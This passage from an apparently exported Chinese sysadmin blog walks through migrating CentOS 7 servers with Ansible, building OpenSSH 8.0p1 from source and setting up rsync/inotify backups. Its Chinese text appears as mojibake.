&quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125; failed: [192.168.206.132] (item=common.sh) =&gt; &#123;&quot;changed&quot;: false, &quot;checksum&quot;: &quot;b8554aa38d74846821d3575eaf72854f2eb40338&quot;, &quot;item&quot;: &quot;common.sh&quot;, &quot;msg&quot;: &quot;Aborting, target uses selinux but python bindings (libselinux-python) aren&#39;t installed!&quot;&#125; è¿™ä¸ªé—®é¢˜ä¸»è¦æ˜¯ç”± SELinuxï¼ˆSecurity-Enhanced Linuxï¼‰å¼•èµ·çš„. CentOS7 ä¸€èˆ¬è‡ªå¸¦ libselinux-python 12# æ²¡æœ‰çš„è¯å¯ä»¥å®‰è£…ä¸€ä¸‹yum -y install libselinux-python ç”±äºæˆ‘ä¸å¤§äº†è§£å®ƒ, å¹²è„†å°±æŠŠå®ƒçš„ç¦ç”¨äº†, è®°å¾—åœ¨ç›®æ ‡ä¸»æœºç¦ç”¨å–”.. 123sed -i &#x27;/^SELINUX/s/SELINUX=enforcing/SELINUX=disabled/&#x27; /etc/selinux/config &amp;&amp;sed -i &#x27;/^SELINUX/s/SELINUX=permissive/SELINUX=disabled/&#x27; /etc/selinux/config æ›´æ–°æºä¸ºé˜¿é‡Œäº‘æºè¿™ä¸ªè¿‡ç¨‹å¯èƒ½è¦ä¸‹è½½çš„ä¸œè¥¿è¾ƒå¤šï¼Œæœ‰äº›ä¸»æœºå¯èƒ½å†™åˆ°å¤§åŠå°±è¿æ¥è¶…æ—¶äº†ã€‚å¯¹äºå°‘è®¸ä¸»æœºå¯ä»¥ç›´è¿ä¸Šå»æ‰§è¡Œ yum update 1ansible-playbook yum_aliyun_source_role.yml openssh å®‰è£…å¯ç”¨ telnet ä»¥é˜²ä¸‡ä¸€12ansible webGroup -m shell -a &#x27;yum -y install xinetd telnet-server&#x27;ansible webGroup -m shell -a &#x27;ls -ll /etc/xinetd.d/telnet&#x27; æ·»åŠ ç”¨æˆ·ä»¥é˜²ä¸‡ä¸€1234567---- hosts: webGroup remote_user: root tasks: - name: create username user user: name=username password=yourpassword 123456789---- hosts: &#123;&#123; runHost &#125;&#125; remote_user: root tasks: - name: create username group group: name=username state=absent - name: create username user user: name=username state=absent å…³é—­é˜²ç«å¢™ï¼Œè®©å¤–è¾¹çš„ telnet è¯·æ±‚å¯ä»¥è¿›æ¥ 1firewall-cmd --add-service=telnet --permanent æˆ–è€… 1234iptables -I INPUT -p tcp --dport 23 -jACCEPTiptables -I INPUT -p udp --dport 23 -jACCEPTservice iptables saveservice iptables restart å‡†å¤‡å·¥ä½œå®Œæˆï¼Œå¼€å§‹å®‰è£… OpenSSH1ansible-playbook openssh_role.yml ç¡®è®¤æ˜¯å¦å‡çº§æˆåŠŸ 1ansible webGroup -m shell -a &quot;ssh -V&quot; é‡å¯ä¸€ä¸‹ä¸»æœºï¼Œç­‰å¾…å°‘è®¸æ—¶é—´å¹¶æ£€æµ‹ sshd çš„çŠ¶æ€ï¼Œ 123ansible webGroup -m shell -a &quot;reboot&quot;ansible webGroup -m shell -a &quot;systemctl status sshd&quot; å¯¹äºæœ‰é—®é¢˜çš„å°‘è®¸ä¸»æœºå¯ä»¥ç›´è¿ä¸Šå»æ‰§è¡Œ systemctl stop sshd å¹¶ç­‰å¾…å°‘è®¸æ‰§è¡Œsystemctl start sshd å¼€å¯é˜²ç«å¢™ï¼Œé˜»æ­¢å¤–è¾¹çš„ telnet è¯·æ±‚è¿›æ¥ 1firewall-cmd --remove-service=telnet æˆ–è€… 1iptables -A INPUT -p tcp --dport 23 -jDROP å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£… nginx 1.16.01ansible-playbook nginx_role.yml nginxçš„é…ç½®æ ¹æ®æ—§æœåŠ¡å™¨çš„æ¥å°±å¥½äº†. nginx åŒå†—ä½™nginx å­˜æ´»æ¢æµ‹è„šæœ¬é“¾æ¥é…ç½®æ–‡ä»¶çš„ é“¾æ¥åœ¨æ­¤//æ³¨æ„äº‹é¡¹// è„šæœ¬è¦ç”¨åˆ° killall å‘½ä»¤, æ²¡æœ‰çš„åŒå­¦è®°å¾—è£…, centos killallçš„åŒ…æ˜¯ï¼Œä¸è¿‡æˆ‘çš„è„šæœ¬ä¼šé»˜è®¤å¸®ä½ è£…ä¸Šã€‚ 1yum -y install psmisc é˜²ç«å¢™çš„çš„ç½‘å¡ eth0 è®°å¾—è·Ÿæ ¹æ®è‡ªå·±çš„ç½‘å¡æ¥ 12firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPTfirewall-cmd --reload nginx è´Ÿè½½å‡è¡¡è¿™ä¸ªæ¯”è¾ƒå®¹æ˜“, éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœç”¨åˆ° session è®°å¾—ç”¨ å“ˆå¸Œæ³• å³æ·»åŠ  ip_hash; åˆ° upsteam ä¸­å°±å¥½å•¦ å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£… PHP7.21ansible-playbook php_role.yml æ ¹æ®ç½‘ä¸Šèµ„æ–™æ¨èä½¿ç”¨ sock è€Œä¸”ä¸æ˜¯ ç«¯å£cgi æ¨¡å¼phpæ—§æœåŠ¡å™¨çš„é…ç½®æ›´æ¢äº† /etc/php.ini å’Œ /etc/php-fpm.d/www.conf æ–‡ä»¶åˆ°æ–°æœåŠ¡ä¸­ å¯¹ç›¸åº”çš„æœåŠ¡å™¨å®‰è£… mysql5.71ansible-playbook mysql_role.yml å®‰è£…å®Œåè®°å¾—å¯¹å¯¼å…¥çš„æ•°æ®æˆæƒå–”ï¼ï¼ï¼ä¸ç„¶è¿œç¨‹è¿æ¥ä¼šè¢«ç¦æ­¢æ‰çš„ã€‚ ä¸ºäº†æ–¹ä¾¿çŸ¥é“è‡ªå·±æ“æ§å“ªä¸ªæœåŠ¡å™¨åœ¨ /etc/bashrc æˆ– ~/.bashrc æ–‡ä»¶æœ€åæ·»åŠ  1export PS1=&quot;[\\u@`hostname -I | cut -d &quot;.&quot; -f 4`\\W]# &quot; ç„¶å source ä¸€ä¸‹ è°ƒæ•´æ—¶é—´ã€æ—¶åŒºç”±äºæˆ‘çš„æ—¶é—´å’ŒåŒ—äº¬æ—¶é—´æ˜¯ä¸€æ ·çš„, æ‰€ä»¥æˆ‘å°±çœç•¥è¿™æ­¥å•¦! nfs æœåŠ¡å™¨çš„è¿ç§»common.sh å’Œ nfs.sh è„šæœ¬ä½ç½®é¦–å…ˆé…ç½®è¦ä½¿ç”¨ nfs æœåŠ¡çš„æœåŠ¡å™¨è·¯å¾„ # /etc/exports æ–‡ä»¶ /home/www/æŸä¸ªç«™ç‚¹ ipåœ°å€(rw,sync,all_squash,no_subtree_check) /home/www/æŸä¸ªç«™ç‚¹ IPåœ°å€(rw,sync,all_squash,no_subtree_check) /home è·¯å¾„æ˜¯ä¸‹å›¾ mounted on ä¸‹çš„è·¯å¾„ å‚æ•°è¯´æ˜: rw è¯»å†™æƒé™ sync æ•°æ®åŒæ­¥å†™å…¥å†…å­˜ç¼“å†²åŒºå’Œç¡¬ç›˜, ä¿è¯æ•°æ®ä¸€è‡´ all_squash æ‰€æœ‰è®¿é—®ç”¨æˆ·éƒ½æ˜ å°„ä¸ºåŒ¿åç”¨æˆ·æˆ–ç”¨æˆ·ç»„ no_subtree_check å³ä½¿è¾“å‡ºç›®å½•æ˜¯ä¸€ä¸ªå­ç›®å½•ï¼ŒnfsæœåŠ¡å™¨ä¹Ÿä¸æ£€æŸ¥å…¶çˆ¶ç›®å½•çš„æƒé™ æŠŠæ–‡ä»¶ä¼ é€åˆ°ç›®æ ‡æœåŠ¡å™¨balabalaï½ 1systemctl reload nfs å…è®¸ç›¸åº”æœåŠ¡çš„é˜²ç«å¢™ 1234firewall-cmd --add-service=nfs --permanent --zone=publicfirewall-cmd --add-service=mountd --permanent --zone=publicfirewall-cmd --add-service=rpc-bind --permanent --zone=publicfirewall-cmd --reload åˆ›å»ºç›¸åº”æ–‡ä»¶çš„è½¯è¿æ¥æ–¹ä¾¿nfsä¸Šnginxçš„ä½¿ç”¨åœ¨webæœåŠ¡å™¨ä¸Šåˆ›å»ºè¦æŒ‚è½½çš„æ–‡ä»¶å¤¹å¹¶æŒ‚è½½ ä¸´æ—¶æŒ‚è½½ 1mount -t nfs nfsçš„IPåœ°å€:è·¯å¾„ æœ¬æœºè·¯å¾„ /etc/fstab æ–‡ä»¶æ·»åŠ ä»¥ç”¨äºå¼€æœºå¯åŠ¨ nfsçš„ipåœ°å€:è·¯å¾„ æœ¬æœºè·¯å¾„ nfs rw 0 0 nfsçš„ipåœ°å€:è·¯å¾„ æœ¬æœºè·¯å¾„ nfs rw 0 0 éœ€è¦ä¸»è¦ï¼Œä¸¤å°ä¸åŒæœåŠ¡å™¨çš„ç”¨æˆ·çš„gidå’Œuidä¸€ä¸ä¸€è‡´ï¼Œä¸ç„¶ä¼šå‡ºç°æ—§æœåŠ¡å™¨æ— æ³•å†™å…¥çš„ç°è±¡ rsync å¢é‡å¤‡ä»½å°å‰è¨€: æƒé™æ˜æ˜å¤Ÿï¼Œä½†æ˜¯ä¸€ç›´æŠ¥è¿™ä¸ªé”™ï¼š rsync: recv_generator: mkdir &quot;test&quot; (in home_131) failed: Permission denied (13) åæ¥å‘ç° selinux æ²¡å…³é—­ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ é¦–å…ˆå¼€æ”¾ç«¯å£å§ï¼å¦‚æœç”¨çš„æ˜¯ iptables 1vi etc/sysconfig/iptables æ·»åŠ  -A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT æˆ–è€…ç›´æ¥ 1iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT ç„¶åå†é‡å¯ä¸€ä¸‹å°±è¡Œäº† 1systemctl restart iptables æˆ– 1iptables-save å¦‚æœç”¨çš„æ˜¯ firewalld 123firewall-cmd --add-port=873/tcp --permanent &amp;&amp;firewall-cmd --reload &amp;&amp;firewall-cmd --list-port æˆ‘æ­å»ºçš„ rsync æ˜¯è¿™æ ·å­çš„ï¼Œä¸»æœåŠ¡å™¨ (ä¹Ÿå°±æ˜¯æ­£åœ¨è¿è¡ŒWebæœåŠ¡å™¨çš„æœåŠ¡å™¨) æ–‡ä»¶å‘ç”Ÿæ”¹å˜ (å†…å®¹æ”¹å˜æˆ–è€…æ–‡ä»¶æœ¬èº«çš„å¢åŠ æˆ–è€…åˆ é™¤) å°±ä¼šé€šè¿‡ç›‘å¬è„šæœ¬è‡ªåŠ¨å¤‡ä»½åˆ°å¤‡ä»½æœåŠ¡å™¨ ä»¥ä¸‹å®‰è£…å’Œé…ç½® rsync æ˜¯å‚è€ƒè¯¥é“¾æ¥ ç«™é•¿é‚£äº›äº‹å„¿ ä¸¤å°æœåŠ¡å™¨ä¸€èµ·å®‰è£… rsync1yum install rsync xinetd -y è¿˜è¦å¢åŠ ä¸€ä¸ªé…ç½®æ–‡ä»¶ (è¿™ä¸ªé…ç½®æ–‡ä»¶åœ¨CentOS7ä¸‹ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬æ‰‹åŠ¨åˆ›å»º) 1vi /etc/xinetd.d/rsync å†…å®¹å¦‚ä¸‹ # default: off # description: The rsync server is a good addition to an ftp server, as it \\ # allows crc checksumming etc. service rsync &#123; disable = no flags = IPv6 socket_type = stream wait = no user = root server = /usr/bin/rsync server_args = --daemon log_on_failure += USERID &#125; æ˜¯ ä»è¿™é‡Œ æ‰¾æ»´ï¼Œäº²æµ‹å¯ç”¨ æ¥ä¸‹æ¥æ˜¯ è´Ÿè´£å¤‡ä»½çš„æœåŠ¡å™¨ çš„äº‹æƒ…äº†1vi /etc/rsyncd.conf æ·»åŠ ä»¥ä¸‹å†…å®¹ log file = /var/log/rsyncd.log pidfile = /var/run/rsyncd.pid lock file = /var/run/rsync.lock secrets file = /etc/rsync.pass motd file = /etc/rsyncd.Motd #æ¨¡å—åç§° [test] #ä½ æƒ³å¤‡ä»½åœ¨æœ¬æœåŠ¡å™¨å“ªä¸ªè·¯å¾„å°±å¡«å‘— path = /home/test #æè¿°éšä¾¿åŠ  comment = just a test uid = 0 gid = 0 port = 873 use chroot = no read only = no list = no max connections = 200 timeout = 600 #è®¤è¯ç”¨æˆ·åï¼Œå¯ä»¥éšä¾¿å– auth users = test_user #ä¸»æœåŠ¡å™¨IPåœ°å€ hosts allow = ä½ çš„ipåœ°å€ è®¤è¯ç”¨æˆ·å’Œå¯†ç æ–‡ä»¶ï¼Œç³»ç»ŸåŸæœ¬æ²¡æœ‰ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨åˆ›å»ºçš„å–”ã€‚è¯¥æ–‡ä»¶åå­—å¯ä»¥éšæ„ 1vi /etc/rsync.pass é‡Œé¢æ˜¯å†…å®¹æ˜¯ é”®å€¼å¯¹ test_user:testpass è¿™é‡Œæ³¨æ„å•¦ï¼Œå¿…é¡»æ˜¯æƒé™å¿…é¡»æ˜¯ 600 å–” 123chmod 600 /etc/rsyncd.conf &amp;&amp;chmod 600 /etc/rsync.pass &amp;&amp;service xinetd restart å¯åŠ¨ rsync æœ‰äº›éœ€è¦æœ‰äº›ä¸éœ€è¦ï¼Œ å¯èƒ½æ˜¯é˜²ç«å¢™åŸå› é˜»æ‹¦äº†å…¶ä»–ç«¯å£â€¦ 1rsync --daemon --config&#x3D;&#x2F;etc&#x2F;rsyncd.conf --port&#x3D;873 æ¥ä¸‹æ¥åˆ° ä¸»æœåŠ¡å™¨ çš„äº‹æƒ…äº†é¦–å…ˆåˆ›å»ºå¯†ç æ–‡ä»¶ï¼Œæ–‡ä»¶åå­—ä¹Ÿæ˜¯å¯ä»¥éšæ„å–”ï¼ 1vi /etc/passwd.rsync å†…å®¹æ³¨æ„å•¦ testpass æ˜¯ åˆšåˆšå¤‡ä»½æœåŠ¡å™¨ /etc/rsync.pass ç›®å½•ä¸‹è®¤è¯ç”¨æˆ·çš„å¯†ç å–”ï¼Œåªéœ€å¡«ä¸Šé¢çº¢å­—çš„å†…å®¹å°±OKå•¦ è¿™é‡Œæƒé™ä¹Ÿè¦æ³¨æ„ï¼Œå¿…é¡»æ˜¯ 600 å–” 12chmod 600 /etc/passwd.rsync &amp;&amp;service xinetd restart å…ˆå®‰è£…é¢„ç¼–è¯‘æ‰€éœ€è¦çš„å·¥å…· 1yum install make gcc gcc-c++ -y ç„¶åä¸‹è½½å’Œå®‰è£…inotify-tools 123456cd /usr/local/src &amp;&amp;wget https://download.laobuluo.com/tools/inotify-tools-3.14.tar.gz &amp;&amp;tar -zxvf inotify-tools-3.14.tar.gz &amp;&amp;cd inotify-tools-3.14 &amp;&amp;./configure --prefix=/usr/local/inotify &amp;&amp;make &amp;&amp; make install é…ç½®ç¯å¢ƒå˜é‡ 1234echo &quot;PATH=/usr/local/inotify/bin:$PATH&quot; &gt;&gt;/etc/profile.d/inotify.sh &amp;&amp;source /etc/profile.d/inotify.sh &amp;&amp;echo &quot;/usr/local/inotify/lib&quot; &gt;/etc/ld.so.conf.d/inotify.conf &amp;&amp;ln -s /usr/local/inotify/include /usr/include/inotify é…ç½®å‚æ•° 1vi /etc/sysctl.conf æ³¨é‡Šåé¢æ·»åŠ  fs.inotify.max_queued_events=99999999 fs.inotify.max_user_watches=99999999 fs.inotify.max_user_instances=65535 åˆ›å»ºæ’é™¤ç›®å½•åˆ—è¡¨ 1vi /usr/local/inotify/exclude.list åˆ›å»ºä¸€ä¸ªæ’é™¤ç›®å½•ï¼Œè¿™é‡Œå¯ä»¥æ·»åŠ ä¸åŒæ­¥çš„ç›®å½•ï¼Œä¸€è¡Œä¸€ä¸ªç›®å½•ã€‚å¦‚æœæš‚æ—¶æ²¡æœ‰å¯ä»¥ç•™ç©ºï¼Œä»¥åéœ€è¦ç”¨åˆ°åœ¨æ·»åŠ ã€‚ å¦‚æœ uploads ç›®å½•æ˜¯æŒ‚è½½ç›®å½•å¯ä»¥æ’é™¤æ‰ wp-content/uploads/ å¢é‡å¤‡ä»½è„šæœ¬ 1vi /usr/local/inotify/rsync.sh 123456789101112131415161718192021222324#!/bin/sh#ä¸»æœåŠ¡å™¨éœ€è¦å¤‡ä»½çš„ç›®å½•srcdir=/home/test#æ¨¡å—åç§°dstdir=testexcludedir=/usr/local/inotify/exclude.list#è®¤è¯åç§°rsyncuser=test_user#æœ¬æœºå­˜å¯†ç çš„ç›®å½•rsyncpassdir=/etc/passwd.rsync#å¤‡ä»½æœåŠ¡å™¨çš„IPåœ°å€dstip=&quot;å¤‡ä»½æœåŠ¡å™¨æ»´IPåœ°å€&quot;for ip in $dstipdorsync -avH --port=873 --progress --delete --exclude-from=$excludedir $srcdir $rsyncuser@$ip::$dstdir --password-file=$rsyncpassdirdone/usr/local/inotify/bin/inotifywait -mrq --timefmt &#x27;%d/%m/%y %H:%M&#x27; --format &#x27;%T %w%f%e&#x27; -e close_write,modify,delete,create,attrib,move $srcdir | while read filedofor ip in $dstipdorsync -avH --port=873 --progress --delete --exclude-from=$excludedir $srcdir $rsyncuser@$ip::$dstdir --password-file=$rsyncpassdirecho &quot; $&#123;file&#125; was rsynced&quot; &gt;&gt; /tmp/rsync.log 2&gt;&amp;1donedone è„šæœ¬å¯æ‰§è¡Œæƒé™ 1chmod +x /usr/local/inotify/rsync.sh æ·»åŠ å¼€æœºå¯åŠ¨ 1vi /etc/rc.d/rc.local å¼€æœºå¯åŠ¨æ–‡ä»¶ä¸­æœ€åä¸€è¡Œæ·»åŠ  sh /usr/local/inotify/rsync.sh &amp; é€šè¿‡äº’æ¢ ip è¿ç§»æœåŠ¡å™¨Centosé‡å¯ç½‘ç»œé…ç½®æ–‡ä»¶ä¼šå¯¼è‡´ /etc/resolv.conf è¢«è¦†ç›–æˆ–æ¸…ç©º è¿›è€Œå¯¼è‡´ yum æ— æ³•ä½¿ç”¨","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"è¿ç»´/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"ansible","permalink":"https://tari.moe/tags/ansible/"}]},{"title":"Install_OpenSSH8.0p1_from_source","slug":"Install-OpenSSH8-0p1-from-source","date":"2019-07-14T08:04:44.000Z","updated":"2021-04-02T02:16:28.048Z","comments":true,"path":"2019/07/14/Install-OpenSSH8-0p1-from-source/","link":"","permalink":"https://tari.moe/2019/07/14/Install-OpenSSH8-0p1-from-source/","excerpt":"","text":"ç³»ç»Ÿç¯å¢ƒ: CentOS-7-x86_64-Minimal-1511rootç”¨æˆ·+å¤‡ä»½+ä¸‹è½½åŒ…+æ ¡éªŒåŒ… ä¸€æ°”å‘µæˆPackage Information (åŒ…çš„ç›¸å…³ä¿¡æ¯) Download (HTTP): https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.0p1.tar.gz Download MD5 sum: bf050f002fe510e1daecd39044e1122d Download size: 1.5 MB Estimated disk space required: 45 MB (add 12 MB for tests) Estimated build time: 0.4 SBU (running the tests takes 17+ minutes, irrespective of processor speed) è™½ç„¶æ²¡å‡ºè¿‡äº‹, ä½†è¿˜æ˜¯è¦ç•™æ¡é€€è·¯å®‰è£… telnet 12yum -y install telnet-server.x86_64 &amp;&amp;yum -y install telnet.x86_64 å®‰è£… xinetd (æä¾›è®¿é—®å’Œæ—¥å¿—ç®¡ç†ç­‰åŠŸèƒ½) 1yum -y install xinetd.x86_64 å¼€å¯æœåŠ¡ &amp;&amp; å¼€æœºå¯åŠ¨ 12345systemctl start xinetd &amp;&amp;systemctl start telnet.socket &amp;&amp;systemctl enable telnet.socket &amp;&amp;systemctl enable xinetd.service é¢„ç¼–è¯‘å¦‚æœç›´æ¥ä¸Šå¯èƒ½å‡ºç°ä»¥ä¸‹ 4 ä¸ªé—®é¢˜: ä¸€checking for cc... no checking for gcc... no configure: error: in \\`/root/openssh-8.0p1&#39;: configure: error: no acceptable C compiler found in $PATH See \\`config.log&#39; for more details ç¼ºå°‘ cc å’Œ gcc ç¼–è¯‘å™¨, è§£å†³æ–¹æ³•: 1yum -y install cc gcc äºŒchecking for zlib.h... no configure: error: *** zlib.h missing - please install first or check config.log *** ç¼ºå°‘ zlib-devel ç¯å¢ƒ, è§£å†³æ–¹æ³•: 1yum -y install zlib-devel ä¸‰configure: error: *** working libcrypto not found, check config.log libcrypto æœ‰ç‚¹çœ¼ç†Ÿâ€¦è§£å†³æ–¹æ³•: 1yum install openssl-devel å››configure: error: PAM headers not found ç¼ºå°‘pam-develç¯å¢ƒ, è§£å†³æ–¹æ³•: 1yum install pam-devel è®¾ç½®é€‚å½“çš„ç¯å¢ƒä»¥ç”¨äºå…¶ä»–å®‰è£…æ­¥éª¤ï¼š 123456789install -v -m700 -d /var/lib/sshd &amp;&amp;chown -v root:sys /var/lib/sshd &amp;&amp;groupadd -g 50 sshd &amp;&amp;useradd -c &#x27;sshd PrivSep&#x27; \\ -d /var/lib/sshd \\ -g sshd \\ -s /bin/false \\ -u 50 sshd å®‰è£…å®˜ç½‘çš„ç¼–è¯‘åº”è¯¥æœ¨å¾—é—®é¢˜äº† 12345./configure --prefix=/usr \\ --sysconfdir=/etc/ssh \\ --with-md5-passwords \\ --with-pam \\ --with-privsep-path=/var/lib/sshd ç¼–è¯‘å¹¶æµ‹è¯•ä¸‹make &amp;&amp; make test å®‰è£…12345678make install &amp;&amp;install -v -m755 contrib/ssh-copy-id /usr/bin &amp;&amp;install -v -m644 contrib/ssh-copy-id.1 \\ /usr/share/man/man1 &amp;&amp;install -v -m755 -d /usr/share/doc/openssh-8.0p1 &amp;&amp;install -v -m644 INSTALL LICENCE OVERVIEW README* \\ /usr/share/doc/openssh-8.0p1 é‡åˆ°çš„ä¸¤ä¸ªé”™è¯¯ä¿¡æ¯ä¸€/etc/ssh/sshd_config line 79: Unsupported option GSSAPIAuthentication /etc/ssh/sshd_config line 80: Unsupported option GSSAPICleanupCredentials æ³¨é‡Šæ‰è¿™ä¸¤è¡Œå°±å¥½å•¦, è§£å†³æ–¹æ³•: 12345sed -i &#x27;/^GSSAPICleanupCredentials/s/GSSAPICleanupCredentials yes/#GSSAPICleanupCredentials yes/&#x27; /etc/ssh/sshd_config &amp;&amp;sed -i &#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication yes/#GSSAPIAuthentication yes/&#x27; /etc/ssh/sshd_config &amp;&amp;sed -i &#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication no/#GSSAPIAuthentication no/&#x27; /etc/ssh/sshd_config äºŒ@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0640 for &#39;/etc/ssh/ssh_host_rsa_key&#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Unable to load host key &quot;/etc/ssh/ssh_host_rsa_key&quot;: bad permissions Unable to load host key: /etc/ssh/ssh_host_rsa_key @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0640 for &#39;/etc/ssh/ssh_host_ecdsa_key&#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Unable to load host key &quot;/etc/ssh/ssh_host_ecdsa_key&quot;: bad permissions Unable to load host key: /etc/ssh/ssh_host_ecdsa_key @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0640 for &#39;/etc/ssh/ssh_host_ed25519_key&#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Unable to load host key &quot;/etc/ssh/ssh_host_ed25519_key&quot;: bad permissions Unable to load host key: /etc/ssh/ssh_host_ed25519_key sshd: no hostkeys available -- exiting. make: [check-config] Error 1 (ignored) ä¸Šé¢ä¸‰ä¸ªæ–‡ä»¶çš„æƒé™é—®é¢˜, è§£å†³æ–¹æ³•: 123chmod 600 /etc/ssh/ssh_host_rsa_key &amp;&amp;chmod 600 /etc/ssh/ssh_host_ecdsa_key &amp;&amp;chmod 600 /etc/ssh/ssh_host_ed25519_key ä¿®æ”¹é…ç½®æ–‡ä»¶,å…è®¸rootç™»å½•12sed -i &#x27;/^#PermitRootLogin/s/#PermitRootLogin no/PermitRootLogin yes/&#x27; /etc/ssh/sshd_config &amp;&amp;sed -i &#x27;/^#PermitRootLogin/s/#PermitRootLogin yes/PermitRootLogin yes/&#x27; /etc/ssh/sshd_config sshd å¼€æœºå¯åŠ¨1systemctl enable sshd è¿˜æœ‰åˆ«å¿˜äº†å…³é—­ telnet å–”! 12systemctl stop xinetd &amp;&amp;systemctl stop telnet.socket &amp;&amp; â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” END â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"CentOS7_backup","slug":"CentOS7-backup","date":"2019-07-13T04:20:32.000Z","updated":"2021-04-02T02:15:24.392Z","comments":true,"path":"2019/07/13/CentOS7-backup/","link":"","permalink":"https://tari.moe/2019/07/13/CentOS7-backup/","excerpt":"","text":"å‚è€ƒé“¾æ¥: å·¦å®¢ rsyncå¢é‡å¤‡ä»½ tar å¤‡ä»½å¤±è´¥ä¸€ä¸ªå°å‘:æˆ‘åœ¨æ‰§è¡Œä¸‹é¢å‘½ä»¤çš„æ—¶å€™, å¦‚æœæˆ‘ä¸æ˜¯åœ¨æ ¹ç›®å½•, ä¼šå¯¼è‡´å¤‡ä»½å¤±è´¥, ä¸æ˜¯å¾ˆæ‡‚ä¸ºä»€ä¹ˆ. 1time tar cvpjf $&#123;BZ2BACKUP&#125; --exclude=/proc --exclude=/lost+found --exclude=/$&#123;BZ2BACKUP&#125; --exclude=/mnt --exclude=/sys --exclude=/media / rsync ä¸‰ç§å·¥ä½œæ–¹å¼ æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šå®ç°åŒæ­¥ã€‚å‘½ä»¤è¡Œè¯­æ³•æ ¼å¼ä¸ºä¸Šè¿°â€Localâ€æ®µçš„æ ¼å¼ã€‚ æœ¬åœ°ä¸»æœºä½¿ç”¨è¿œç¨‹shellå’Œè¿œç¨‹ä¸»æœºé€šä¿¡ã€‚å‘½ä»¤è¡Œè¯­æ³•æ ¼å¼ä¸ºä¸Šè¿°â€Access via remote shellâ€æ®µçš„æ ¼å¼ã€‚ æœ¬åœ°ä¸»æœºé€šè¿‡ç½‘ç»œå¥—æ¥å­—è¿æ¥è¿œç¨‹ä¸»æœºä¸Šçš„rsync daemonã€‚å‘½ä»¤è¡Œè¯­æ³•æ ¼å¼ä¸ºä¸Šè¿°â€Access via rsync daemonâ€æ®µçš„æ ¼å¼ã€‚ ç›¸å…³å‚æ•°è¯´æ˜: -vï¼šæ˜¾ç¤ºrsyncè¿‡ç¨‹ä¸­è¯¦ç»†ä¿¡æ¯ã€‚å¯ä»¥ä½¿ç”¨\"-vvvv\"è·å–æ›´è¯¦ç»†ä¿¡æ¯ã€‚ -Pï¼šæ˜¾ç¤ºæ–‡ä»¶ä¼ è¾“çš„è¿›åº¦ä¿¡æ¯ã€‚(å®é™…ä¸Š\"-P\"=\"--partial --progress\"ï¼Œå…¶ä¸­çš„\"--progress\"æ‰æ˜¯æ˜¾ç¤ºè¿›åº¦ä¿¡æ¯çš„)ã€‚ -n --dry-run ï¼šä»…æµ‹è¯•ä¼ è¾“ï¼Œè€Œä¸å®é™…ä¼ è¾“ã€‚å¸¸å’Œ\"-vvvv\"é…åˆä½¿ç”¨æ¥æŸ¥çœ‹rsyncæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ -a --archive ï¼šå½’æ¡£æ¨¡å¼ï¼Œè¡¨ç¤ºé€’å½’ä¼ è¾“å¹¶ä¿æŒæ–‡ä»¶å±æ€§ã€‚ç­‰åŒäº\"-rtopgDl\"ã€‚ -r --recursiveï¼šé€’å½’åˆ°ç›®å½•ä¸­å»ã€‚ -t --timesï¼šä¿æŒmtimeå±æ€§ã€‚å¼ºçƒˆå»ºè®®ä»»ä½•æ—¶å€™éƒ½åŠ ä¸Š\"-t\"ï¼Œå¦åˆ™ç›®æ ‡æ–‡ä»¶mtimeä¼šè®¾ç½®ä¸ºç³»ç»Ÿæ—¶é—´ï¼Œå¯¼è‡´ä¸‹æ¬¡æ›´æ–° ï¼šæ£€æŸ¥å‡ºmtimeä¸åŒä»è€Œå¯¼è‡´å¢é‡ä¼ è¾“æ— æ•ˆã€‚-o 